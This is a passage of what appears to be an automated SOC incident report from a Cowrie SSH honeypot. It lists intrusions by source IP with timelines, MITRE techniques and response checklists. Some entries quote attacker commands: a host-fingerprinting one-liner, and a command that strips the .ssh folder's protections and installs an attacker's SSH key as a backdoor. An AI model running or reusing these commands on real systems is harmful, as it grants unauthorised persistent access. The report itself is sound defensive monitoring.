| `2026-08-29 17:45:14` | `cowrie.session.params` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.success` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.command.input` |
| `2026-08-29 17:45:14` | `cowrie.log.closed` |
| `2026-08-29 17:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0233dad9a159

| Field | Detail |
|---|---|
| **Source IP** | `182.135.63[.]175` |
| **First Seen** | 2026-08-29 17:45 |
| **Last Seen** | 2026-08-29 17:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:45:55` | `cowrie.session.connect` |
| `2026-08-29 17:45:56` | `cowrie.client.version` |
| `2026-08-29 17:45:56` | `cowrie.client.kex` |
| `2026-08-29 17:46:00` | `cowrie.login.success` |
| `2026-08-29 17:46:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.135.63[.]175` to AbuseIPDB if not already reported
- [ ] Block `182.135.63[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9c26b1ac59

| Field | Detail |
|---|---|
| **Source IP** | `66.175.138[.]122` |
| **First Seen** | 2026-08-29 17:46 |
| **Last Seen** | 2026-08-29 17:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:46:06` | `cowrie.session.connect` |
| `2026-08-29 17:46:06` | `cowrie.client.version` |
| `2026-08-29 17:46:06` | `cowrie.client.kex` |
| `2026-08-29 17:46:08` | `cowrie.login.success` |
| `2026-08-29 17:46:08` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.175.138[.]122` to AbuseIPDB if not already reported
- [ ] Block `66.175.138[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ab90d30320

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:48 |
| **Last Seen** | 2026-08-29 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:48:00` | `cowrie.session.connect` |
| `2026-08-29 17:48:00` | `cowrie.client.version` |
| `2026-08-29 17:48:00` | `cowrie.client.kex` |
| `2026-08-29 17:48:01` | `cowrie.login.success` |
| `2026-08-29 17:48:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:48:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:48:02` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4a2ebb941f

| Field | Detail |
|---|---|
| **Source IP** | `85.225.13[.]121` |
| **First Seen** | 2026-08-29 17:49 |
| **Last Seen** | 2026-08-29 17:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:49:08` | `cowrie.session.connect` |
| `2026-08-29 17:49:09` | `cowrie.client.version` |
| `2026-08-29 17:49:09` | `cowrie.client.kex` |
| `2026-08-29 17:49:10` | `cowrie.login.success` |
| `2026-08-29 17:49:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.225.13[.]121` to AbuseIPDB if not already reported
- [ ] Block `85.225.13[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32f8bea0166

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:49 |
| **Last Seen** | 2026-08-29 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:49:15` | `cowrie.session.connect` |
| `2026-08-29 17:49:15` | `cowrie.client.version` |
| `2026-08-29 17:49:15` | `cowrie.client.kex` |
| `2026-08-29 17:49:15` | `cowrie.login.success` |
| `2026-08-29 17:49:16` | `cowrie.session.params` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.success` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.command.input` |
| `2026-08-29 17:49:16` | `cowrie.log.closed` |
| `2026-08-29 17:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e2b60812ab

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-29 17:49 |
| **Last Seen** | 2026-08-29 17:54 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:49:15` | `cowrie.session.connect` |
| `2026-08-29 17:49:16` | `cowrie.client.version` |
| `2026-08-29 17:49:16` | `cowrie.client.kex` |
| `2026-08-29 17:49:17` | `cowrie.login.success` |
| `2026-08-29 17:49:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac56ad196d0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:49 |
| **Last Seen** | 2026-08-29 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:49:29` | `cowrie.session.connect` |
| `2026-08-29 17:49:29` | `cowrie.client.version` |
| `2026-08-29 17:49:29` | `cowrie.client.kex` |
| `2026-08-29 17:49:30` | `cowrie.login.success` |
| `2026-08-29 17:49:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:49:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:49:30` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f46107867adb

| Field | Detail |
|---|---|
| **Source IP** | `111.36.57[.]69` |
| **First Seen** | 2026-08-29 17:51 |
| **Last Seen** | 2026-08-29 17:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:51:06` | `cowrie.session.connect` |
| `2026-08-29 17:51:06` | `cowrie.client.version` |
| `2026-08-29 17:51:10` | `cowrie.client.kex` |
| `2026-08-29 17:51:11` | `cowrie.login.success` |
| `2026-08-29 17:51:14` | `cowrie.session.params` |
| `2026-08-29 17:51:14` | `cowrie.command.input` |
| `2026-08-29 17:51:14` | `cowrie.log.closed` |
| `2026-08-29 17:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.36.57[.]69` to AbuseIPDB if not already reported
- [ ] Block `111.36.57[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffb9c1cebb95

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-08-29 17:51 |
| **Last Seen** | 2026-08-29 17:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:51:26` | `cowrie.session.connect` |
| `2026-08-29 17:51:27` | `cowrie.client.version` |
| `2026-08-29 17:51:27` | `cowrie.client.kex` |
| `2026-08-29 17:51:28` | `cowrie.login.success` |
| `2026-08-29 17:51:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a5ded9a77f

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-08-29 17:51 |
| **Last Seen** | 2026-08-29 17:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:51:39` | `cowrie.session.connect` |
| `2026-08-29 17:51:40` | `cowrie.client.version` |
| `2026-08-29 17:51:40` | `cowrie.client.kex` |
| `2026-08-29 17:51:43` | `cowrie.login.success` |
| `2026-08-29 17:51:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2885d10c67

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-08-29 17:51 |
| **Last Seen** | 2026-08-29 17:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:51:51` | `cowrie.session.connect` |
| `2026-08-29 17:51:53` | `cowrie.client.version` |
| `2026-08-29 17:51:53` | `cowrie.client.kex` |
| `2026-08-29 17:51:57` | `cowrie.login.success` |
| `2026-08-29 17:51:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae7932ee6e1

| Field | Detail |
|---|---|
| **Source IP** | `211.58.176[.]42` |
| **First Seen** | 2026-08-29 17:53 |
| **Last Seen** | 2026-08-29 17:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:53:59` | `cowrie.session.connect` |
| `2026-08-29 17:54:00` | `cowrie.client.version` |
| `2026-08-29 17:54:00` | `cowrie.client.kex` |
| `2026-08-29 17:54:02` | `cowrie.login.success` |
| `2026-08-29 17:54:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.58.176[.]42` to AbuseIPDB if not already reported
- [ ] Block `211.58.176[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d4a94572ee

| Field | Detail |
|---|---|
| **Source IP** | `202.53.94[.]242` |
| **First Seen** | 2026-08-29 17:54 |
| **Last Seen** | 2026-08-29 17:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:54:09` | `cowrie.session.connect` |
| `2026-08-29 17:54:09` | `cowrie.client.version` |
| `2026-08-29 17:54:09` | `cowrie.client.kex` |
| `2026-08-29 17:54:11` | `cowrie.login.success` |
| `2026-08-29 17:54:12` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.53.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `202.53.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7847c68f0a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:54 |
| **Last Seen** | 2026-08-29 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:54:37` | `cowrie.session.connect` |
| `2026-08-29 17:54:37` | `cowrie.client.version` |
| `2026-08-29 17:54:37` | `cowrie.client.kex` |
| `2026-08-29 17:54:37` | `cowrie.login.success` |
| `2026-08-29 17:54:38` | `cowrie.session.params` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.success` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.command.input` |
| `2026-08-29 17:54:38` | `cowrie.log.closed` |
| `2026-08-29 17:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397e6fc6f629

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 17:55 |
| **Last Seen** | 2026-08-29 17:55 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:55:04` | `cowrie.session.connect` |
| `2026-08-29 17:55:04` | `cowrie.client.version` |
| `2026-08-29 17:55:04` | `cowrie.client.kex` |
| `2026-08-29 17:55:04` | `cowrie.login.success` |
| `2026-08-29 17:55:05` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:55:05` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 17:55:05` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf2d8cd6ab4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:58 |
| **Last Seen** | 2026-08-29 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:58:50` | `cowrie.session.connect` |
| `2026-08-29 17:58:50` | `cowrie.client.version` |
| `2026-08-29 17:58:50` | `cowrie.client.kex` |
| `2026-08-29 17:58:51` | `cowrie.login.success` |
| `2026-08-29 17:58:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:58:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:58:52` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ba4b0a772a9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:59 |
| **Last Seen** | 2026-08-29 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:59:03` | `cowrie.session.connect` |
| `2026-08-29 17:59:03` | `cowrie.client.version` |
| `2026-08-29 17:59:03` | `cowrie.client.kex` |
| `2026-08-29 17:59:04` | `cowrie.login.success` |
| `2026-08-29 17:59:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:59:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:59:04` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9689924a4941

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:59 |
| **Last Seen** | 2026-08-29 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:59:32` | `cowrie.session.connect` |
| `2026-08-29 17:59:32` | `cowrie.client.version` |
| `2026-08-29 17:59:32` | `cowrie.client.kex` |
| `2026-08-29 17:59:33` | `cowrie.login.success` |
| `2026-08-29 17:59:34` | `cowrie.session.params` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.success` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.command.input` |
| `2026-08-29 17:59:34` | `cowrie.log.closed` |
| `2026-08-29 17:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4449ada5360

| Field | Detail |
|---|---|
| **Source IP** | `49.212.154[.]161` |
| **First Seen** | 2026-08-29 17:59 |
| **Last Seen** | 2026-08-29 17:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:59:34` | `cowrie.session.connect` |
| `2026-08-29 17:59:34` | `cowrie.client.version` |
| `2026-08-29 17:59:34` | `cowrie.client.kex` |
| `2026-08-29 17:59:35` | `cowrie.login.success` |
| `2026-08-29 17:59:36` | `cowrie.session.params` |
| `2026-08-29 17:59:36` | `cowrie.command.input` |
| `2026-08-29 17:59:36` | `cowrie.command.failed` |
| `2026-08-29 17:59:36` | `cowrie.log.closed` |
| `2026-08-29 17:59:37` | `cowrie.session.params` |
| `2026-08-29 17:59:37` | `cowrie.command.input` |
| `2026-08-29 17:59:37` | `cowrie.session.file_download` |
| `2026-08-29 17:59:37` | `cowrie.log.closed` |
| `2026-08-29 17:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.212.154[.]161` to AbuseIPDB if not already reported
- [ ] Block `49.212.154[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6b03833ba4

| Field | Detail |
|---|---|
| **Source IP** | `49.212.154[.]161` |
| **First Seen** | 2026-08-29 17:59 |
| **Last Seen** | 2026-08-29 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:59:37` | `cowrie.session.connect` |
| `2026-08-29 17:59:37` | `cowrie.client.version` |
| `2026-08-29 17:59:37` | `cowrie.client.kex` |
| `2026-08-29 17:59:38` | `cowrie.login.success` |
